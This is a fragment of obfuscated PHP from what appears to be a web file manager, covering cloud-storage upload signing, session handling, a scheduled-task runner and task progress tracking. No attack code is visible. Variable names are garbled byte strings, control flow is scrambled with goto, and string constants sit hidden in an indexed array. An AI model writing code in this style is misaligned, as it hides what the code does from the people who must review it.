? $Aæ©½ß‘å : _get($f…­ë§™, $b¯ÔÚ£×Ï‡[207]); $Aæ©½ß‘å = $Aæ©½ß‘å ? $Aæ©½ß‘å : _get($f…­ë§™, $b¯ÔÚ£×Ï‡[197], $b¯ÔÚ£×Ï‡[33]); return $Aæ©½ß‘å; } public function uploadFormData($F‚ë±Û©ªÆ, $c¥‹²º…ë° = 3600) { $AæãËë¯Úœ =& $_SERVER[¯Ò¬Èè]; $Aµø„ÄâîÊ = $this->pathFather($F‚ë±Û©ªÆ); $BÊ¡Çë…æÔ = $this->client->getHttpUploadPostParams($this->bucket, $Aµø„ÄâîÊ, $AæãËë¯Úœ[185], $c¥‹²º…ë°); return array_merge((array) $BÊ¡Çë…æÔ, array($AæãËë¯Úœ[169] => $this->getHost())); } public function multiUploadFormData($eèÃà™½óë, $dçõ™“ŞØ÷ = 3600) { $dôºÈ²ó¥ =& $_SERVER[¯Ò¬Èè]; $cœ¹ÖÇë’÷ = gmdate($dôºÈ²ó¥[208]); $DİÓö¿ = array(); $F¼ù¸»ƒçˆ = $this->client->getUploadId($this->bucket, $eèÃà™½óë, $DİÓö¿); if (!$F¼ù¸»ƒçˆ) { return !1; } return array($dôºÈ²ó¥[209] => $F¼ù¸»ƒçˆ, $dôºÈ²ó¥[169] => $this->getHost() . $dôºÈ²ó¥[8] . $this->pathEncode($eèÃà™½óë), $dôºÈ²ó¥[210] => $cœ¹ÖÇë’÷, $dôºÈ²ó¥[89] => $eèÃà™½óë); } public function multiUploadAuthData($d˜¬£¹•…â, $B•ÁÍÚº = array()) { goto E¢„ÄÍÒà¿; aŒß¦…·: $DÉÜ“êÁà’ = array($f‹Ÿ‚„±‡È[212], $f‹Ÿ‚„±‡È[33], $f‹Ÿ‚„±‡È[116], $f‹Ÿ‚„±‡È[33], "\170\55\x61\155\x7a\x2d\144\141\x74\145\72{$d¡ÑòØ©‘¿}", $f‹Ÿ‚„±‡È[8] . $this->bucket . $f‹Ÿ‚„±‡È[8] . $this->pathEncode($E«‡¸¶¹ø) . $BÉëÜÊÌÏ); if (strpos($BÉëÜÊÌÏ, $f‹Ÿ‚„±‡È[213]) === 0) { $DÉÜ“êÁà’[0] = $f‹Ÿ‚„±‡È[214]; } if (isset($B•ÁÍÚº[$f‹Ÿ‚„±‡È[215]]) && $B•ÁÍÚº[$f‹Ÿ‚„±‡È[215]] == $f‹Ÿ‚„±‡È[216]) { $DÉÜ“êÁà’[0] = $f‹Ÿ‚„±‡È[216]; } goto E¶’’«“‘; E¢„ÄÍÒà¿: $f‹Ÿ‚„±‡È =& $_SERVER[¯Ò¬Èè]; $d¡ÑòØ©‘¿ = isset($B•ÁÍÚº[$f‹Ÿ‚„±‡È[210]]) ? $B•ÁÍÚº[$f‹Ÿ‚„±‡È[210]] : gmdate($f‹Ÿ‚„±‡È[208]); $BÉëÜÊÌÏ = isset($B•ÁÍÚº[$f‹Ÿ‚„±‡È[160]]) ? $B•ÁÍÚº[$f‹Ÿ‚„±‡È[160]] : $f‹Ÿ‚„±‡È[33]; goto B§áÏ¶ä”‘; e…¶ñ¢ãè»: if (strpos($BÉëÜÊÌÏ, $f‹Ÿ‚„±‡È[213]) === 0) { return array($f‹Ÿ‚„±‡È[220] => $cÉÚõ‡î”², $f‹Ÿ‚„±‡È[210] => $d¡ÑòØ©‘¿); } return $cÉÚõ‡î”²; goto F‹œÓñÊ™Š; B§áÏ¶ä”‘: $E«‡¸¶¹ø = $B•ÁÍÚº[$f‹Ÿ‚„±‡È[89]]; unset($B•ÁÍÚº[$f‹Ÿ‚„±‡È[89]]); if (isset($B•ÁÍÚº[$f‹Ÿ‚„±‡È[211]])) { $B•ÁÍÚº[$f‹Ÿ‚„±‡È[210]] = $d¡ÑòØ©‘¿; return $this->listUploadParts($E«‡¸¶¹ø, $B•ÁÍÚº); } goto aŒß¦…·; E¶’’«“‘: $Fø¯´ë‘–‘ = implode($f‹Ÿ‚„±‡È[217], $DÉÜ“êÁà’); $a¡ù³«ğÌö = base64_encode(hash_hmac($f‹Ÿ‚„±‡È[218], $Fø¯´ë‘–‘, $this->secret, !0)); $cÉÚõ‡î”² = $f‹Ÿ‚„±‡È[219] . $this->accessKey . $f‹Ÿ‚„±‡È[4] . $a¡ù³«ğÌö; goto e…¶ñ¢ãè»; F‹œÓñÊ™Š: } public function listUploadParts($f¬¥¾è×ÄÏ, $a¾¬Ì¯×Óø = array()) { goto fÀĞÓÖ­ùª; fÑ÷Îà¶ƒ¬: $b…ºÀì…èö = $this->multiUploadAuthData($f¬¥¾è×ÄÏ, $a¾¬Ì¯×Óø); if (empty($b…ºÀì…èö)) { return !1; } return array($C–Ö„´®òÑ[220] => $b…ºÀì…èö, $C–Ö„´®òÑ[210] => $a¾¬Ì¯×Óø[$C–Ö„´®òÑ[210]], $C–Ö„´®òÑ[222] => $B‰”‹Ùƒ‹ô); goto F ¯¥÷ó‘; AÀ†ç½÷Œ: if (!$B‰”‹Ùƒ‹ô) { return !1; } unset($a¾¬Ì¯×Óø[$C–Ö„´®òÑ[211]], $a¾¬Ì¯×Óø[$C–Ö„´®òÑ[215]]); $a¾¬Ì¯×Óø[$C–Ö„´®òÑ[89]] = $f¬¥¾è×ÄÏ; goto fÑ÷Îà¶ƒ¬; fÀĞÓÖ­ùª: $C–Ö„´®òÑ =& $_SERVER[¯Ò¬Èè]; $f¯‹Ê×Ş‚Ò = str_replace($C–Ö„´®òÑ[221], $C–Ö„´®òÑ[33], $a¾¬Ì¯×Óø[$C–Ö„´®òÑ[160]]); $B‰”‹Ùƒ‹ô = $this->client->listParts($this->bucket, $f¬¥¾è×ÄÏ, $f¯‹Ê×Ş‚Ò); goto AÀ†ç½÷Œ; F ¯¥÷ó‘: } public function getHost() { return parent::getHost() . $_SERVER[¯Ò¬Èè][8] . $this->bucket; } public function size($aêŒ™Ğ®Åà) { $f‘ŠÜá»­” = $this->objectMeta($aêŒ™Ğ®Åà); return $f‘ŠÜá»­” ? $f‘ŠÜá»­”[$_SERVER[¯Ò¬Èè][77]] : 0; } public function info($DÉò›Æ¿£–) { if ($this->isFolder($DÉò›Æ¿£–)) { return $this->folderInfo($DÉò›Æ¿£–); } else { if ($this->isFile($DÉò›Æ¿£–)) { return $this->fileInfo($DÉò›Æ¿£–); } } return !1; } public function exist($c“ïæ¤ÓÄ˜) { return $this->isFile($c“ïæ¤ÓÄ˜) || $this->isFolder($c“ïæ¤ÓÄ˜); } public function isFile($dŸ²½ÇŠ†¦) { return !$this->isFolder($dŸ²½ÇŠ†¦) && $this->objectMeta($dŸ²½ÇŠ†¦); } public function isFolder($a†“‘çê) { return $this->cacheMethod($_SERVER[¯Ò¬Èè][223], $a†“‘çê); } protected function objectMeta($BÃ‡»§¶Š) { return $this->cacheMethod($_SERVER[¯Ò¬Èè][224], $BÃ‡»§¶Š); } protected function _objectMeta($b‹µÑ©°¥) { $a™•¯Ÿ§Šµ =& $_SERVER[¯Ò¬Èè]; $b‹µÑ©°¥ = rtrim($b‹µÑ©°¥, $a™•¯Ÿ§Šµ[8]); try { $bô³Õğ·Ñ¶ = $this->client->getObjectInfo($this->bucket, $b‹µÑ©°¥); if (!isset($bô³Õğ·Ñ¶[$a™•¯Ÿ§Šµ[207]]) && isset($bô³Õğ·Ñ¶[$a™•¯Ÿ§Šµ[225]])) { $bô³Õğ·Ñ¶[$a™•¯Ÿ§Šµ[207]] = $bô³Õğ·Ñ¶[$a™•¯Ÿ§Šµ[225]]; } } catch (Exception $D‘†§Äù“‰) { $bô³Õğ·Ñ¶ = !1; } if (!$bô³Õğ·Ñ¶) { } return $bô³Õğ·Ñ¶; } protected function _isFolder($cÍ½áÏõÃæ) { goto bñ°¶º‰; a”è’¿Å¨³: if (substr($e«†ÆšÕÏ[0][$EËÂ«×·‡æ[28]], -1) == $EËÂ«×·‡æ[8]) { return !0; } if (get_path_this($e«†ÆšÕÏ[0][$EËÂ«×·‡æ[28]]) == get_path_this($cÍ½áÏõÃæ)) { return !1; } return !0; goto b¦Í©Ğ†£‰; eˆ ‘ÑˆèÇ: $e«†ÆšÕÏ = $this->client->getBucket($this->bucket, $cÍ½áÏõÃæ, null, 1); if (empty($e«†ÆšÕÏ)) { return !1; } $e«†ÆšÕÏ = array_values($e«†ÆšÕÏ); goto a”è’¿Å¨³; bñ°¶º‰: $EËÂ«×·‡æ =& $_SERVER[¯Ò¬Èè]; $cÍ½áÏõÃæ = rtrim($cÍ½áÏõÃæ, $EËÂ«×·‡æ[8]); if ($cÍ½áÏõÃæ == $EËÂ«×·‡æ[33] || $cÍ½áÏõÃæ == $EËÂ«×·‡æ[8]) { return !0; } goto eˆ ‘ÑˆèÇ; b¦Í©Ğ†£‰: } } define($_SERVER[¯Ò¬Èè][226], 1); goto F–²ğÅƒ¾Ù; b¶ÇÜ´¯™”: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto EîòÆŠÖã¸; aÓ›“òì‘Ú: $d¥¦¿ì«È = _get($GLOBALS, $Eš¨æ¦ƒ«õ[1407], $d¥¦¿ì«È); if (self::$sessionSign) { } else { if (Cookie::get($d¥¦¿ì«È)) { self::$sessionSign = Cookie::get($d¥¦¿ì«È); } else { self::$sessionSign = guid(); } } Cookie::setSafe($d¥¦¿ì«È, self::$sessionSign, self::$sessionTime); goto cÈ³’ÏÍ½‚; añÃÖÚ¶Ïİ: $Bö”ˆ’¨Ğî = $GLOBALS[$Eš¨æ¦ƒ«õ[6]][$Eš¨æ¦ƒ«õ[337]]; self::$sessionTime = $Bö”ˆ’¨Ğî[$Eš¨æ¦ƒ«õ[1406]]; $d¥¦¿ì«È = SESSION_ID; goto aÓ›“òì‘Ú; EîòÆŠÖã¸: $Eš¨æ¦ƒ«õ =& $_SERVER[¯Ò¬Èè]; static $CÂ÷Ş¸¬ù = false; if ($CÂ÷Ş¸¬ù) { return $CÂ÷Ş¸¬ù; } goto añÃÖÚ¶Ïİ; c¡Ï¦ÅÙŒ©: switch ($cÁØ’ˆ´Âº) { case $Eš¨æ¦ƒ«õ[17]: self::$handle = Model($Eš¨æ¦ƒ«õ[771]); break; case $Eš¨æ¦ƒ«õ[772]: self::$handle = new CacheRedis($dŞ÷ÍäŒÖõ, $FÄšŠÜ´ì); break; case $Eš¨æ¦ƒ«õ[773]: self::$handle = new CacheMemcached($dŞ÷ÍäŒÖõ, $FÄšŠÜ´ì); break; case $Eš¨æ¦ƒ«õ[167]: $dŞ÷ÍäŒÖõ[$Eš¨æ¦ƒ«õ[75]] = $dŞ÷ÍäŒÖõ[$Eš¨æ¦ƒ«õ[75]] . $Eš¨æ¦ƒ«õ[1409]; self::$handle = new CacheFile($dŞ÷ÍäŒÖõ, $FÄšŠÜ´ì); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $CÂ÷Ş¸¬ù = new self(); goto DÉ©Ö·êÇ³; DÉ©Ö·êÇ³: return $CÂ÷Ş¸¬ù; goto cò®ˆÒ‰Øß; cÈ³’ÏÍ½‚: $cÁØ’ˆ´Âº = $Bö”ˆ’¨Ğî[$Eš¨æ¦ƒ«õ[1408]]; $dŞ÷ÍäŒÖõ = $Bö”ˆ’¨Ğî[$cÁØ’ˆ´Âº]; $FÄšŠÜ´ì = $Bö”ˆ’¨Ğî[$Eš¨æ¦ƒ«õ[770]]; goto c¡Ï¦ÅÙŒ©; cò®ˆÒ‰Øß: } public static function sign($bã•ÒÁÅˆÍ = false) { $bã•ÒÁÅˆÍ && (self::$sessionSign = $bã•ÒÁÅˆÍ); self::init(); return self::$sessionSign; } public static function set($fÀáª¯ôñ‰, $FåïÌ“„ŞÌ = false) { self::init(); if (is_array($fÀáª¯ôñ‰)) { foreach ($fÀáª¯ôñ‰ as $BŠ¦³˜ÖÌĞ => $F§›ö¡Âö) { array_set_value(self::$data, $BŠ¦³˜ÖÌĞ, $F§›ö¡Âö); } } else { array_set_value(self::$data, $fÀáª¯ôñ‰, $FåïÌ“„ŞÌ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($fŞ‹ï”»ÂÆ = false) { self::init(); if (!$fŞ‹ï”»ÂÆ) { return self::$data; } return array_get_value(self::$data, $fŞ‹ï”»ÂÆ); } public static function remove($d‹êâ„¿ñ) { self::init(); unset(self::$data[$d‹êâ„¿ñ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¯Ò¬Èè][775])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto dÏñ³ØĞ¿É; dÏñ³ØĞ¿É: $c©Ìèˆ­è =& $_SERVER[¯Ò¬Èè]; if (self::valueGet($c©Ìèˆ­è[703]) != $c©Ìèˆ­è[83]) { return; } if (self::valueGet($c©Ìèˆ­è[1410]) == $c©Ìèˆ­è[83]) { $EóˆäÊğµ¢ = self::valueGet($c©Ìèˆ­è[1411]); if (time() - $EóˆäÊğµ¢ > 3600 * 2) { self::restart(); } return; } goto A‘ÏåÆŞ×; DÍõÊ…™ñ²: while (!0) { self::cacheClear(); if (self::valueGet($c©Ìèˆ­è[703]) != $c©Ìèˆ­è[83]) { self::valueSet($c©Ìèˆ­è[1410], $c©Ìèˆ­è[468]); self::log($c©Ìèˆ­è[1414]); die; } self::valueSet($c©Ìèˆ­è[1410], $c©Ìèˆ­è[83]); self::valueSet($c©Ìèˆ­è[1411], time()); self::taskRunAll(); sleep(self::valueGet($c©Ìèˆ­è[1415])); } goto BÖ÷®Íã¶ñ; A‘ÏåÆŞ×: http_close(); self::valueSet($c©Ìèˆ­è[1410], $c©Ìèˆ­è[83]); Hook::bind($c©Ìèˆ­è[1412], $c©Ìèˆ­è[1413]); goto DÍõÊ…™ñ²; BÖ÷®Íã¶ñ: } public static function restart() { $dÜàÚ³Äø‡ =& $_SERVER[¯Ò¬Èè]; http_close(); self::valueSet($dÜàÚ³Äø‡[703], $dÜàÚ³Äø‡[468]); sleep(self::valueGet($dÜàÚ³Äø‡[1415]) + 5); self::valueSet($dÜàÚ³Äø‡[1410], $dÜàÚ³Äø‡[468]); self::valueSet($dÜàÚ³Äø‡[703], $dÜàÚ³Äø‡[83]); } public static function shutdownEvent() { $C‰Á’×æ’‹ =& $_SERVER[¯Ò¬Èè]; self::valueSet($C‰Á’×æ’‹[1410], $C‰Á’×æ’‹[468]); self::log($C‰Á’×æ’‹[1416]); } public static function config($d…‘­ÙïÁé, $B½½ê÷Æí) { $F’Ëá°Ú§ =& $_SERVER[¯Ò¬Èè]; $FŠ‡’Ì‹˜Š = 20; $B½½ê÷Æí = intval($B½½ê÷Æí) <= $FŠ‡’Ì‹˜Š ? $FŠ‡’Ì‹˜Š : intval($B½½ê÷Æí); self::valueSet($F’Ëá°Ú§[703], $d…‘­ÙïÁé); self::valueSet($F’Ëá°Ú§[1415], $B½½ê÷Æí); } private static function taskRunAll() { $d««®öÕ—¦ =& $_SERVER[¯Ò¬Èè]; $aÍÓ÷½ä“ = Model($d««®öÕ—¦[1417])->listData(); $E¢»»ù¸½Ó = count($aÍÓ÷½ä“); for ($fÖÜï¶Ë¼¾ = 0; $fÖÜï¶Ë¼¾ < $E¢»»ù¸½Ó; $fÖÜï¶Ë¼¾++) { $CÄìˆ¾™ = $aÍÓ÷½ä“[$fÖÜï¶Ë¼¾]; if ($CÄìˆ¾™[$d««®öÕ—¦[1418]] != $d««®öÕ—¦[83]) { continue; } if (!self::taskTimeCheck($CÄìˆ¾™)) { continue; } self::taskRun($CÄìˆ¾™); } Hook::trigger($d««®öÕ—¦[1419]); } private static function taskTimeCheck($CÖˆ¦¶‰à) { goto b¤õ¡ÖÌØÖ; b¤õ¡ÖÌØÖ: $C»¾ì¼Ã½ =& $_SERVER[¯Ò¬Èè]; $D‰ÓÎ©›×É = json_decode($CÖˆ¦¶‰à[$C»¾ì¼Ã½[190]], !0); $aš×ÈĞë“à = intval($CÖˆ¦¶‰à[$C»¾ì¼Ã½[1411]]); goto D÷¶òØƒ; Cõ’ä˜°¯‘: switch ($D‰ÓÎ©›×É[$C»¾ì¼Ã½[29]]) { case $C»¾ì¼Ã½[1426]: if (time() - $aš×ÈĞë“à < 3600 * 24 * 30) { return !1; } if ($D‰ÓÎ©›×É[$C»¾ì¼Ã½[1426]] == date($C»¾ì¼Ã½[1427]) && $f£†¹È‰Ùî) { return !0; } break; case $C»¾ì¼Ã½[1428]: if (time() - $aš×ÈĞë“à < 3600 * 24 * 7) { return !1; } $cÛÛç’Ó±í = date($C»¾ì¼Ã½[1429]) == 0 ? 7 : date($C»¾ì¼Ã½[1429]); if ($D‰ÓÎ©›×É[$C»¾ì¼Ã½[1428]] == $cÛÛç’Ó±í && $f£†¹È‰Ùî) { return !0; } break; case $C»¾ì¼Ã½[1421]: if (time() - $aš×ÈĞë“à < 3600 * 24) { return !1; } if ($f£†¹È‰Ùî) { return !0; } break; case $C»¾ì¼Ã½[1430]: if (time() - $aš×ÈĞë“à >= floatval($D‰ÓÎ©›×É[$C»¾ì¼Ã½[1430]]) * 60) { return !0; } break; default: break; } return !1; goto f¶áˆá•‘; D÷¶òØƒ: $DÆƒ³Œ’¤ = strtotime($C»¾ì¼Ã½[1420] . $D‰ÓÎ©›×É[$C»¾ì¼Ã½[1421]] . $C»¾ì¼Ã½[1422]) - strtotime($C»¾ì¼Ã½[1423]); $DÂÅÈìèµ = time() - strtotime(date($C»¾ì¼Ã½[1424]) . $C»¾ì¼Ã½[1425]); $f£†¹È‰Ùî = $DÂÅÈìèµ >= $DÆƒ³Œ’¤ && $DÂÅÈìèµ <= $DÆƒ³Œ’¤ + 3600; goto Cõ’ä˜°¯‘; f¶áˆá•‘: } public static function taskRun($eÑ£´¤óÖ) { goto CÊ£Ê¬ÄÖø; E–“æİ’Í: $eĞ»”’’´ = timeFloat(); $CÂ‡ŞÊ¯µ† = $d·Ô‡é¸Æ[33]; switch ($eÑ£´¤óÖ[$d·Ô‡é¸Æ[29]]) { case $d·Ô‡é¸Æ[295]: $C®–½®«²  = url_request($eÑ£´¤óÖ[$d·Ô‡é¸Æ[1434]], $d·Ô‡é¸Æ[216], !1, !1, !1, !1, 5); $CÂ‡ŞÊ¯µ† = strlen($C®–½®«² ); break; case $d·Ô‡é¸Æ[215]: $CÂ‡ŞÊ¯µ† = Hook::apply($eÑ£´¤óÖ[$d·Ô‡é¸Æ[1434]]); default: break; } goto F¦„¸ƒò‚Ø; F¦„¸ƒò‚Ø: Model($d·Ô‡é¸Æ[1435])->add(array($d·Ô‡é¸Æ[1436] => $d·Ô‡é¸Æ[33], $d·Ô‡é¸Æ[1437] => $d·Ô‡é¸Æ[468], $d·Ô‡é¸Æ[29] => $d·Ô‡é¸Æ[1438] . $eÑ£´¤óÖ[$d·Ô‡é¸Æ[367]], $d·Ô‡é¸Æ[1439] => json_encode(array($d·Ô‡é¸Æ[28] => $eÑ£´¤óÖ[$d·Ô‡é¸Æ[28]], $d·Ô‡é¸Æ[1440] => timeFloat() - $eĞ»”’’´, $d·Ô‡é¸Æ[281] => $CÂ‡ŞÊ¯µ†)))); self::log($d·Ô‡é¸Æ[1441] . $eÑ£´¤óÖ[$d·Ô‡é¸Æ[367]] . $d·Ô‡é¸Æ[1442] . $CÂ‡ŞÊ¯µ†); return !0; goto CÌï™ª©ĞÄ; CÊ£Ê¬ÄÖø: $d·Ô‡é¸Æ =& $_SERVER[¯Ò¬Èè]; self::log($d·Ô‡é¸Æ[1431] . $eÑ£´¤óÖ[$d·Ô‡é¸Æ[367]] . $d·Ô‡é¸Æ[1432] . $eÑ£´¤óÖ[$d·Ô‡é¸Æ[28]] . $d·Ô‡é¸Æ[1433] . $eÑ£´¤óÖ[$d·Ô‡é¸Æ[1434]]); Model($d·Ô‡é¸Æ[1417])->run($eÑ£´¤óÖ[$d·Ô‡é¸Æ[367]]); goto E–“æİ’Í; CÌï™ª©ĞÄ: } private static function valueGet($b³Ä©¿ò) { $EÌ—ÉÀ§î =& $_SERVER[¯Ò¬Èè]; $Cä¥°óî¯ù = $EÌ—ÉÀ§î[1443]; $B­˜»©ÆÈª = Model($EÌ—ÉÀ§î[1444])->get($b³Ä©¿ò, $Cä¥°óî¯ù); if (is_null($B­˜»©ÆÈª)) { Model($EÌ—ÉÀ§î[1444])->set($EÌ—ÉÀ§î[1415], 10, $Cä¥°óî¯ù); Model($EÌ—ÉÀ§î[1444])->set($EÌ—ÉÀ§î[703], $EÌ—ÉÀ§î[83], $Cä¥°óî¯ù); Model($EÌ—ÉÀ§î[1444])->set($EÌ—ÉÀ§î[1410], $EÌ—ÉÀ§î[468], $Cä¥°óî¯ù); $B­˜»©ÆÈª = Model($EÌ—ÉÀ§î[1444])->get($b³Ä©¿ò, $Cä¥°óî¯ù); } return $B­˜»©ÆÈª; } private static function valueSet($Bá±ôõ¼, $d­öÇİª³é) { $dĞÔ­¬ñ±˜ =& $_SERVER[¯Ò¬Èè]; return Model($dĞÔ­¬ñ±˜[1444])->set($Bá±ôõ¼, $d­öÇİª³é, $dĞÔ­¬ñ±˜[1443]); } protected static function log($EÙØ¨ÊÂ¤) { write_log($EÙØ¨ÊÂ¤, $_SERVER[¯Ò¬Èè][1445]); } private static function cacheClear() { $FğùÀ¬È¥ =& $_SERVER[¯Ò¬Èè]; $b½ˆÊÈ‘©œ = Model($FğùÀ¬È¥[1444])->cacheKey($FğùÀ¬È¥[1443]); Cache::clearMemory($b½ˆÊÈ‘©œ); } } class Task { const STATYS_STOP = "\163\x74\157\x70"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\156\147"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($d®©•¶ , $dØØà×±ÃŞ = '', $c¼óÂÙ ¡ = 0, $FÛÃÒ±Ÿò = '') { goto eƒôº¥Ã°´; b¢Ë‘›Ó¡å: Hook::bind($e‚©âºŒ[1412], array($this, $e‚©âºŒ[1454])); Hook::bind($e‚©âºŒ[1455], array($this, $e‚©âºŒ[1456])); $this->startAfter(); goto fÓŸÜ¦ ’Œ; fÓŸÜ¦ ’Œ: Hook::trigger($e‚©âºŒ[1457], $this->task); $this->task[$e‚©âºŒ[1451]] = timeFloat(); goto d£ÔğÏ¥¾÷; eƒôº¥Ã°´: $e‚©âºŒ =& $_SERVER[¯Ò¬Èè]; if (self::get($d®©•¶ )) { return; } $this->task = array($e‚©âºŒ[367] => $d®©•¶ , $e‚©âºŒ[1446] => USER_ID, $e‚©âºŒ[1352] => $FÛÃÒ±Ÿò, $e‚©âºŒ[29] => $dØØà×±ÃŞ, $e‚©âºŒ[987] => $e‚©âºŒ[33], $e‚©âºŒ[985] => $c¼óÂÙ ¡, $e‚©âºŒ[999] => 0, $e‚©âºŒ[1447] => 0, $e‚©âºŒ[1448] => 0, $e‚©âºŒ[1449] => timeFloat(), $e‚©âºŒ[1450] => 0, $e‚©âºŒ[1451] => 0, $e‚©âºŒ[1452] => 0, $e‚©âºŒ[1453] => 0, $e‚©âºŒ[703] => $e‚©âºŒ[1410]); goto b¢Ë‘›Ó¡å; d£ÔğÏ¥¾÷: } public function end() { goto f¦ˆèÊËì; f¦ˆèÊËì: $BàŸÓ˜™Ê° =& $_SERVER[¯Ò¬Èè]; if (!$this->task) { return; } if ($this->task[$BàŸÓ˜™Ê°[1451]]) { self::valueSet($this->task[$BàŸÓ˜™Ê°[367]], !1); } goto D¥Šš††ÔÙ; Cãö­ãÈÑÊ: Hook::unbind($BàŸÓ˜™Ê°[1455], array($this, $BàŸÓ˜™Ê°[1456])); $this->endAfter(); $this->task = !1; goto cß¨»“ï‘Ù; D¥Šš††ÔÙ: $dÇÁ‚Äã—¢ = timeFloat() - $this->task[$BàŸÓ˜™Ê°[1449]]; self::log($BàŸÓ˜™Ê°[1458] . $this->task[$BàŸÓ˜™Ê°[367]] . $BàŸÓ˜™Ê°[1459] . $dÇÁ‚Äã—¢ . $BàŸÓ˜™Ê°[1460]); Hook::unbind($BàŸÓ˜™Ê°[1412], array($this, $BàŸÓ˜™Ê°[1454])); goto Cãö­ãÈÑÊ; cß¨»“ï‘Ù: } public function update($a×‰ÔÜ‰ø = 0) { goto e‡Ïíèù¹º; E±¼Ï¬‚²: Hook::trigger($CÛ§–Ó—[1464], $CÊÊ¨ï•±Ã); self::valueSet($CÊÊ¨ï•±Ã[$CÛ§–Ó—[367]], $CÊÊ¨ï•±Ã); goto c‚Ê†ÃÌÁ; F˜ª“½™ÁÖ: $CÊÊ¨ï•±Ã[$CÛ§–Ó—[703]] = $fÂĞô‡»Ğ® ? $fÂĞô‡»Ğ® : $CÊÊ¨ï•±Ã[$CÛ§–Ó—[703]]; $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1452]] = $Cæ„Ù¾†ï§[$CÛ§–Ó—[1452]] ? $Cæ„Ù¾†ï§[$CÛ§–Ó—[1452]] : 0; $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1451]] = timeFloat(); goto E±¼Ï¬‚²; dªÉéØ¦Ç: $this->updateAfter(); $bñÀ„š¦ƒ› = 0.2; if (timeFloat() - $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1451]] < $bñÀ„š¦ƒ›) { return; } goto EÒøÏ­¥ÀŒ; e‡Ïíèù¹º: $CÛ§–Ó— =& $_SERVER[¯Ò¬Èè]; $CÊÊ¨ï•±Ã =& $this->task; if (!$CÊÊ¨ï•±Ã) { return; } goto D‘óĞ½Õ‘Ã; EÒøÏ­¥ÀŒ: $Cæ„Ù¾†ï§ = self::get($CÊÊ¨ï•±Ã[$CÛ§–Ó—[367]]); $fÂĞô‡»Ğ® = $Cæ„Ù¾†ï§[$CÛ§–Ó—[703]]; if ($fÂĞô‡»Ğ® == self::STATYS_KILL) { $EÜß„³‚“ = array($CÛ§–Ó—[1461] => LNG($CÛ§–Ó—[1462]), $CÛ§–Ó—[1041] => !1); Cache::set($CÛ§–Ó—[1463] . $this->task[$CÛ§–Ó—[367]], $EÜß„³‚“, 30); $this->end(); die; } else { if ($fÂĞô‡»Ğ® == self::STATYS_STOP) { $dß­Ç¡‚á = 2; $Cæ„Ù¾†ï§[$CÛ§–Ó—[1452]] += $dß­Ç¡‚á; self::valueSet($CÊÊ¨ï•±Ã[$CÛ§–Ó—[367]], $Cæ„Ù¾†ï§); sleep($dß­Ç¡‚á); $this->update(); return; } } goto F˜ª“½™ÁÖ; D‘óĞ½Õ‘Ã: $CÊÊ¨ï•±Ã[$CÛ§–Ó—[999]] += $a×‰ÔÜ‰ø; $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1450]] = timeFloat(); if ($CÊÊ¨ï•±Ã[$CÛ§–Ó—[985]]) { if ($CÊÊ¨ï•±Ã[$CÛ§–Ó—[985]] < $CÊÊ¨ï•±Ã[$CÛ§–Ó—[999]]) { $CÊÊ¨ï•±Ã[$CÛ§–Ó—[985]] = $CÊÊ¨ï•±Ã[$CÛ§–Ó—[999]]; } $E¶åá²ô‰µ = timeFloat() - $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1449]] - $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1452]]; $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1447]] = $CÊÊ¨ï•±Ã[$CÛ§–Ó—[999]] / $CÊÊ¨ï•±Ã[$CÛ§–Ó—[985]]; $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1448]] = $CÊÊ¨ï•±Ã[$CÛ§–Ó—[999]] / $E¶åá²ô‰µ; if ($CÊÊ¨ï•±Ã[$CÛ§–Ó—[1447]] > 0) { $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1453]] = $E¶åá²ô‰µ * (1 - $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1447]]) / $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1447]]; } $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1453]] = $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1453]] <= 0 ? 0 : $CÊÊ¨ï•±Ã[$CÛ§–Ó—[1453]]; } goto dªÉéØ¦Ç; c‚Ê†ÃÌÁ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($d‘À¡½Ó…µ) { $aä ÈœÃ“ =& $_SERVER[¯Ò¬Èè]; Cache::set($aä ÈœÃ“[1463] . $this->task[$aä ÈœÃ“[367]], $d‘À¡½Ó…µ, 60); return $d‘À¡½Ó…µ; } public static function get($C»‚“ŸÑ²´) { return self::valueGet($C»‚“ŸÑ²´); } public static function listData() { $bÕñÆ‡ÂÆ– = self::valueGet(); return array_sort_by($bÕñÆ‡ÂÆ–, $_SERVER[¯Ò¬Èè][1449], !0); } public static function kill($bâŒœ¶Üğ) { return self::changeStatus($bâŒœ¶Üğ, self::STATYS_KILL); } public static function stop($E˜·ëñœÖÖ) { return self::changeStatus($E˜·ëñœÖÖ, self::STATYS_STOP); } public static function restart($AœÓÂíËÀà) { return self::changeStatus($AœÓÂíËÀà, self::STATYS_RUNNING); } public static function killAll() { $f¼„£º¿³ =& $_SERVER[¯Ò¬Èè]; $E²á‚²à” = self::listData(); foreach ($E²á‚²à” as $c¢³Ç¾Å¦) { self::kill($c¢³Ç¾Å¦[$f¼„£º¿³[367]]); } sleep(2); foreach ($E²á‚²à” as $c¢³Ç¾Å¦) { 